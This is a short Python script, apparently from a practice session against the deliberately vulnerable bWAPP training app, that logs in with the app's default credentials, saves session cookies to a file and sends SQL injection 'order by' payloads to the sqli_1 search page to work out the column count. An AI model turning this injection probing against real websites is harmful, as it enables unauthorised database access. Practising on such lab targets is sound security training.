import requests
import os

http = 'http://127.0.0.1:8080'
https = 'https://127.0.0.1:8080'
ftp = 'ftp://127.0.0.1:8080'

proxy_dict = {
    "http": http,
    "https": https,
    "ftp": ftp
}

payload = {'login':'bee', 'password':'bug', 'form':'submit'}

session = requests.Session()

post = session.post('http://beebox/bWAPP/login.php', data=payload, proxies=proxy_dict)

cookieDict = requests.utils.dict_from_cookiejar(session.cookies)
with open('cookz.txt','w') as f:
    print("Dict from cookie jar: ", cookieDict, file=f)

"""
sessionsqli1 = session.get('http://beebox/bWAPP/sqli_1.php', proxies=proxy_dict)

#with open('session_sqli1.html', 'a') as f:
    #print("sqli1 as sessions: ", sessionsqli1.text, file=f)
"""

#Performing a search of 'order by' searches and looking for a difference in response:

for z in range(6,10):
    sqli1_search = session.get('http://beebox/bWAPP/sqli_1.php?title=test%%27+order+by+%s+%%23&action=search' % (z), proxies=proxy_dict)
    sqli1_response = sqli1_search.text

    with open('/tmp/sqli1_search_ob%s.txt' % (z), 'a') as f:
        print("Order by %s Search results: \n" % (z), sqli1_response, file=f)

    individual_search = open('/tmp/sqli1_search_ob%s.txt' % (z))
    ind_search_lines = individual_search.readlines()
    for line in ind_search_lines:
        if '<td colspan="5" width="580">' in line:
            with open('orderByResults.txt', 'a') as f:
                print("Order by %s:" % (z), line.replace('           <td colspan="5" width="580">', '').replace("</td>",""), file=f)

    os.remove("/tmp/sqli1_search_ob%s.txt" % (z))







